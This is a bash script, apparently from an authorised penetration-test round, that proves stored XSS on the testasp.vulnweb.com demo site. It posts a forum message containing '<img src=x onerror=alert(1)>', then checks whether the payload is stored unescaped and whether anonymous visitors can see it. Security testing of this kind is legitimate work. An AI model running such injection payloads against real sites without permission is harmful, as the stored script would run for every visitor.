#!/usr/bin/env bash
# Round 6 — 승인된 상태변경 액션 1건: showthread.asp?id=0 에 게시글 1건 작성 (저장형 XSS 실증)
# 승인 근거: 사용자 5필드 승인 요청 승인(2026-09-23). id 주입 없음, 삭제 임계값(total>100) 무관 확인됨.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
JAR="$OUT/r6_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30)

echo "### 0. BEFORE — showthread.asp?id=0 현재 상태"
"${CURL[@]}" -b "$JAR" -o "$OUT/r6_before.html" -w "code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
echo "posttext 개수: $(grep -c "class='posttext'" "$OUT/r6_before.html")"
echo "RT6 마커 존재: $(grep -c 'RT6-STORED-XSS-PROOF' "$OUT/r6_before.html")"

echo
echo "### 1. POST — 게시글 1건 작성 (tfSubject / tfText, id 는 숫자 리터럴만)"
"${CURL[@]}" -b "$JAR" -c "$JAR" -D "$OUT/r6_post_hdr.txt" -o "$OUT/r6_post_body.html" \
  -w "code=%{http_code} size=%{size_download} redirect=%{redirect_url}\n" \
  -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode 'tfSubject=RT6-STORED-XSS-PROOF' \
  --data-urlencode 'tfText=<img src=x onerror=alert(1)>'
echo "--- 응답 헤더 ---"; grep -iE '^(HTTP/|Location:)' "$OUT/r6_post_hdr.txt" | tr -d '\r'

echo
echo "### 2. AFTER — 같은 스레드 재조회"
sleep 1
"${CURL[@]}" -b "$JAR" -o "$OUT/r6_after.html" -w "code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
echo "posttext 개수: $(grep -c "class='posttext'" "$OUT/r6_after.html")"
echo "RT6 마커 개수: $(grep -c 'RT6-STORED-XSS-PROOF' "$OUT/r6_after.html")"
echo "페이로드 원문(미이스케이프) 개수: $(grep -c '<img src=x onerror=alert(1)>' "$OUT/r6_after.html")"
echo "HTML 이스케이프된 형태 개수: $(grep -c '&lt;img src=x' "$OUT/r6_after.html")"

echo
echo "### 3. 미인증 상태에서도 보이는가 (저장형 = 모든 방문자에게 실행)"
"${CURL[@]}" -o "$OUT/r6_anon.html" -w "anon code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
echo "anon 에서 페이로드 원문 개수: $(grep -c '<img src=x onerror=alert(1)>' "$OUT/r6_anon.html")"

echo
echo "### 4. 저장된 게시글 문맥 (원문 발췌)"
python3 - "$OUT/r6_after.html" <<'EOF'
import sys,re
s=open(sys.argv[1],encoding="latin-1",errors="replace").read()
i=s.find("RT6-STORED-XSS-PROOF")
print(s[max(0,i-700):i+700] if i!=-1 else "RT6 마커를 찾지 못함")
EOF
